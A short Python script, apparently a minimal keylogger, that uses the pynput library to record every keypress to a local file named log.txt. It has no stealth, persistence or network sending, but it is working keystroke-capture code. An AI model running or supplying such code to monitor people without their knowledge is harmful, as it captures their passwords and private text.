import sys

try:
    from pynput import keyboard  # type: ignore[import]
except Exception:
    print("pynput is not installed or cannot be imported. Please install it with: pip install pynput")
    sys.exit(1)


with open("log.txt", "w") as log:
    log.write("")


def on_press(key):
    with open("log.txt", "a") as log:
        log.write(f"{key}\n")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
